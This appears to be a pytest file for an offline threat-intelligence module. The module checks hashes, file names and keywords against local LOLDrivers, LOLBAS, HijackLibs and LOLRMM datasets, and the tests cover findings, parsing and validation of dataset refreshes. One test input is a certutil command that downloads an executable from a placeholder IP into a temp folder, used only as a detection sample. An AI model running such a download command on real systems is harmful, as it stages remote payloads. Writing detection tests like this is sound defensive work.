"""Offline tests of lol_datasets (P268) with the trimmed real fixtures in tests/fixtures/lol_datasets/.

Provenance: ``*_ok.json`` are minimised copies of the live datasets (2026-11-26: 9 LOLDrivers entries
covering malicious, CVE, comma MitreID, 'CVEs' key, 'True', Authentihash-only, unverified and a hash
shared by two drivers; 5 LOLBAS, 6 HijackLibs and 5 LOLRMM entries) with author/acknowledgement fields
dropped; ``*_truncated.json`` are cut mid-object; ``*_not_found_404.html`` are the live 404 bodies;
``lolbas_empty_synthetic.json`` is an empty array."""

from __future__ import annotations

import json

import pytest

from tests.fakes import FakeHttp, fixture, make_runtime, run_module
from v3lum import paths
from v3lum.core.context import ScanOptions
from v3lum.core.datasets import DATASETS, dataset_errors
from v3lum.core.entities import EntityType as T
from v3lum.core.models import Severity, Status
from v3lum.modules.malware_hash import lol_datasets as mod
from v3lum.modules.malware_hash.lol_datasets import (
    DS_HIJACKLIBS,
    DS_LOLBAS,
    DS_LOLDRIVERS,
    DS_LOLRMM,
    LolDatasets,
    iter_json_array,
)

MALICIOUS_SHA256 = "090d409f86430e078694e621ad0bd5e458d32aa727f0eb99bda3961577df8d49"
IQVW_SHA256 = "4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b"
IQVW_MD5 = "1898ceda3247213c084f43637ef163b3"
BANDAI_AUTHENTIHASH = "7fd788358585e0b863328475898bb4400ed8d478466d1b7f5cc0252671456cc8"
SHARED_SHA256 = "177227f68cc28ee7726381b95f7d2215da35be3750157ebcb7e113201059026c"
ACROBROKER_SHA256 = "1f64f01063b26bf05d4b076d54816e54dacd08b7fd6e5bc9cc5d11a548ff2215"
FILES = {DS_LOLDRIVERS: "loldrivers_ok.json", DS_LOLBAS: "lolbas_ok.json", DS_HIJACKLIBS: "hijacklibs_ok.json", DS_LOLRMM: "lolrmm_ok.json"}


def raw(name: str) -> str:
    return (paths_fixture() / name).read_text(encoding="utf-8")


def paths_fixture():
    from tests.fakes import FIXTURES

    return FIXTURES / "lol_datasets"


def install(*names: str, files: dict[str, str] | None = None) -> None:
    """Place local dataset copies as `v3lum data update` would (the module never downloads)."""
    chosen = files or FILES
    for name in names or tuple(chosen):
        (paths.datasets_dir() / name).write_text(raw(chosen[name]), encoding="utf-8")


@pytest.fixture(autouse=True)
def _fresh_memo():
    mod.reset_memo()
    yield
    mod.reset_memo()


def run(entity: str, **kw):
    return run_module(LolDatasets, entity, FakeHttp(), **kw)


# --------------------------------------------------------------------------------------
# metadata, datasets and notices (c1, c2)
# --------------------------------------------------------------------------------------


def test_metadata_matches_the_council_decision():
    cls = LolDatasets
    assert (cls.terms, cls.default_enabled, cls.disclosure, cls.trust_tier, cls.category) == ("open", True, "none", "n/a", "malware_hash")
    assert cls.hosts == () and cls.max_requests == 0 and cls.access_model == "offline"
    assert set(cls.sources) == {"loldrivers.dataset", "lolbas.dataset", "hijacklibs.dataset", "lolrmm.dataset"}
    assert not [e for e in dataset_errors() if "lol_datasets" in e]
    assert DATASETS[DS_LOLDRIVERS]["large"] is True  # 36 MB: never downloaded during a scan (c1)
    assert "GPL-3.0" in DATASETS[DS_LOLBAS]["licence"] and "GPL-3.0" in DATASETS[DS_HIJACKLIBS]["licence"]
    for name in ("lol_datasets_loldrivers", "lol_datasets_lolrmm", "lol_datasets_lolbas", "lol_datasets_hijacklibs"):
        notice = json.loads((paths_fixture().parents[2] / "v3lum" / "data" / "notices" / f"{name}.json").read_text())
        assert notice["bundled"] is False and notice["attribution"]


def test_nothing_is_bundled():
    data_dir = paths_fixture().parents[2] / "v3lum" / "data"
    bundled = [p for p in data_dir.rglob("*.json") if "providers" not in p.parts
               and p.name in ("lolbas.json", "hijacklibs.json", "drivers.json", "rmm_tools.json")]
    assert not bundled  # GPL-3.0 data is a runtime download only (A6, c2)


# --------------------------------------------------------------------------------------
# streaming parser (c3)
# --------------------------------------------------------------------------------------


def test_iter_json_array_streams_items_across_chunk_boundaries():
    doc = json.dumps([{"Id": "a", "name": "caf\u00e9"}, {"Id": "b"}, 3, "x"]).encode("utf-8")
    chunks = [doc[i:i + 7] for i in range(0, len(doc), 7)]  # splits inside the UTF-8 sequence too
    assert list(iter_json_array(chunks)) == [{"Id": "a", "name": "caf\u00e9"}, {"Id": "b"}, 3, "x"]
    assert list(iter_json_array([b"[]"])) == []
    for bad in (b'{"a": 1}', b'[{"a": 1}', b'[1] 2', b"<html>", b'[1 2]'):
        with pytest.raises(ValueError):
            list(iter_json_array([bad]))
    with pytest.raises(ValueError):
        list(iter_json_array([raw("loldrivers_truncated.json").encode()]))


def test_loldrivers_slim_index_never_keeps_the_full_document():
    install(DS_LOLDRIVERS)
    path = paths.datasets_dir() / DS_LOLDRIVERS
    index = mod.load_index(DS_LOLDRIVERS, path)
    assert set(index) == {"drivers", "hashes", "stats"} and index["stats"]["drivers"] == 9
    assert set(next(iter(index["drivers"].values()))) == {"id", "category", "verified", "techniques", "cves", "name", "usecase"}
    assert "KnownVulnerableSamples" not in json.dumps(index)
    assert mod.load_index(DS_LOLDRIVERS, path) is index  # built once per dataset version


# --------------------------------------------------------------------------------------
# LOLDrivers hash hits are findings (c4)
# --------------------------------------------------------------------------------------


def test_malicious_driver_hash_is_high_malware():
    install()
    res = run(f"sha256:{MALICIOUS_SHA256}")
    assert res.status is Status.OK
    [f] = res.findings
    assert f.title == "Known malicious driver (LOLDrivers)" and f.severity is Severity.HIGH
    assert {"malicious", "malware", "malicious_driver"} <= set(f.tags) and f.source == "loldrivers.dataset"
    assert f.references == ["https://www.loldrivers.io/drivers/00561455-9da1-4f0c-8564-e4c99b716a74/"]
    [p] = res.pivots
    assert (p.entity.type, p.entity.value, p.relation, p.expand) == (T.MITRE, "T1068", "uses_technique", False)
    assert res.attributes["loldrivers_hits"][0]["category"] == "malicious"
    assert any(c["name"] == DS_LOLDRIVERS for c in res.datasets)
    assert res.source_statuses["loldrivers.dataset"]["status"] == "ok"


def test_vulnerable_driver_is_byovd_medium_and_high_in_the_org_environment():
    install()
    res = run(f"sha256:{IQVW_SHA256}")
    [f] = res.findings
    assert f.title == "Known vulnerable driver - BYOVD (LOLDrivers)" and f.severity is Severity.MEDIUM
    assert set(f.tags) == {"vulnerable_driver", "byovd"} and "CVE-2015-2291" in f.description
    own = run(f"sha256:{IQVW_SHA256}", options=ScanOptions(subject_roles={f"sha256:{IQVW_SHA256}": "incident_victim"}))
    assert own.findings[0].severity is Severity.HIGH and own.findings[0].data["own_environment"] is True
    md5 = run(f"md5:{IQVW_MD5}")
    assert md5.findings[0].title == "Known vulnerable driver - BYOVD (LOLDrivers)"


def test_authenticode_match_of_an_unverified_entry_is_lower_confidence():
    install()
    res = run(f"authentihash:{BANDAI_AUTHENTIHASH}")
    [f] = res.findings
    assert "Authenticode hash" in f.description and f.data["verified"] is False
    assert f.confidence_label.value == "possible" and f.data["match"] == "authentihash_sha256"


def test_a_hash_shared_by_two_drivers_gives_two_findings():
    install()
    res = run(f"sha256:{SHARED_SHA256}")
    assert len(res.findings) == 2 and len({f.id for f in res.findings}) == 2


# --------------------------------------------------------------------------------------
# LOLBAS / HijackLibs / LOLRMM: context only (c5)
# --------------------------------------------------------------------------------------


def test_lolbas_name_in_a_command_line_is_context_only():
    install()
    res = run("keyword:certutil.exe -urlcache -split -f http://198.51.100.1/a.exe C:\\Windows\\Temp\\a.exe")
    [f] = [x for x in res.findings if "lolbas" in x.tags]
    assert f.title == "LOLBAS binary (living off the land)" and f.severity is Severity.INFO
    assert "context_only" in f.tags and not {"malicious", "malware", "suspicious"} & set(f.tags)
    assert "T1105" in f.data["techniques"] and "Download" in f.data["categories"]
    assert res.attributes["lol_context"][0]["dataset"] == "lolbas"


def test_hijacklibs_dll_lists_every_vendor_once():
    install()
    res = run("keyword:sqlite.dll")
    [f] = res.findings
    assert f.title == "HijackLibs DLL-hijack candidate" and f.data["vendors"] and len(f.data["vendors"]) == 2
    assert "context_only" in f.tags and "hijacklibs" in f.tags and f.data["techniques"] == ["T1574.001"]


def test_lolrmm_tool_names_and_executable_patterns_are_rmm_context():
    install()
    res = run("keyword:AnyDesk")
    [f] = res.findings
    assert f.title == "LOLRMM remote management tool" and {"rmm_tool", "lolrmm", "context_only"} <= set(f.tags)
    assert "legitimate IT use is common" in f.description
    res2 = run("keyword:AnyDesk-5a1b2c.exe")
    assert res2.findings and res2.findings[0].data["name"] == "AnyDesk"


def test_file_inputs_match_by_basename(tmp_path):
    target = tmp_path / "rundll32.exe"
    target.write_bytes(b"MZ not a real binary")
    install()
    res = run(f"file:{target}")
    assert res.status is Status.OK and res.findings[0].title == "LOLBAS binary (living off the land)"


def test_hash_context_from_hijacklibs_executables():
    install()
    res = run(f"sha256:{ACROBROKER_SHA256}")
    [f] = res.findings
    assert f.title == "HijackLibs DLL-hijack candidate" and "context_only" in f.tags and f.severity is Severity.INFO


def test_unknown_values_are_empty():
    install()
    assert run("keyword:notepad-like-tool.exe").status is Status.EMPTY
    assert run(f"sha256:{'ab' * 32}").status is Status.EMPTY


# --------------------------------------------------------------------------------------
# missing, stale and broken local copies (c1)
# --------------------------------------------------------------------------------------


def test_missing_datasets_are_unavailable_with_the_update_hint():
    res = run(f"sha256:{MALICIOUS_SHA256}")
    assert res.status is Status.UNAVAILABLE and res.reason_code == "dataset" and "v3lum data update" in res.error


def test_partially_missing_datasets_keep_the_others_and_report_coverage():
    install(DS_LOLBAS)
    res = run("keyword:sqlite.dll")
    assert res.status is Status.EMPTY
    assert res.source_statuses["hijacklibs.dataset"]["status"] == "unavailable"
    assert res.source_statuses["lolbas.dataset"]["status"] == "empty"


def test_a_truncated_local_copy_is_an_error_never_empty():
    install(DS_LOLDRIVERS, files={DS_LOLDRIVERS: "loldrivers_truncated.json"})
    res = run(f"sha256:{MALICIOUS_SHA256}")
    assert res.status is Status.ERROR and "unreadable" in res.error


def test_the_module_never_downloads_during_a_scan():
    http = FakeHttp()  # no route: any download would fail the test
    res = run_module(LolDatasets, f"sha256:{MALICIOUS_SHA256}", http)
    assert res.status is Status.UNAVAILABLE and not http.calls


# --------------------------------------------------------------------------------------
# refresh validators (c1: a bad download never replaces a good copy)
# --------------------------------------------------------------------------------------


def test_validators_refuse_html_truncated_and_empty_downloads(monkeypatch, tmp_path):
    monkeypatch.setitem(mod.MIN_ITEMS, DS_LOLBAS, 3)
    monkeypatch.setitem(mod.MIN_ITEMS, DS_LOLDRIVERS, 5)
    check_lolbas = mod._validate_array(DS_LOLBAS)
    good = tmp_path / "good.json"
    good.write_text(raw("lolbas_ok.json"))
    assert check_lolbas(good) is True
    for name in ("lolbas_empty_synthetic.json", "hijacklibs_not_found_404.html"):
        bad = tmp_path / name
        bad.write_text(raw(name))
        with pytest.raises(ValueError):
            check_lolbas(bad)
    check_drivers = mod._validate_array(DS_LOLDRIVERS)
    trunc = tmp_path / "trunc.json"
    trunc.write_text(raw("loldrivers_truncated.json"))
    with pytest.raises(ValueError):
        check_drivers(trunc)


def test_refresh_through_the_dataset_manager_keeps_the_previous_copy_on_a_404(monkeypatch):
    monkeypatch.setitem(mod.MIN_ITEMS, DS_LOLBAS, 3)
    monkeypatch.setitem(DATASETS[DS_LOLBAS], "min_bytes", 100)
    url = DATASETS[DS_LOLBAS]["url"]
    http = FakeHttp().add("GET", url, body=raw("lolbas_ok.json").encode(), headers={"content-type": "application/json"}, times=1)
    http.add("GET", url, status=404, text=raw("hijacklibs_not_found_404.html"))
    rt = make_runtime(http)
    assert rt.data.update(DS_LOLBAS).ok
    before = (paths.datasets_dir() / DS_LOLBAS).read_text()
    assert not rt.data.update(DS_LOLBAS).ok
    assert (paths.datasets_dir() / DS_LOLBAS).read_text() == before
    res = run_module(LolDatasets, "keyword:certutil.exe", None, runtime=rt)
    assert res.findings and res.findings[0].title == "LOLBAS binary (living off the land)"


def test_fixture_helper_resolves():
    assert isinstance(fixture("lol_datasets/lolbas_ok.json"), list)
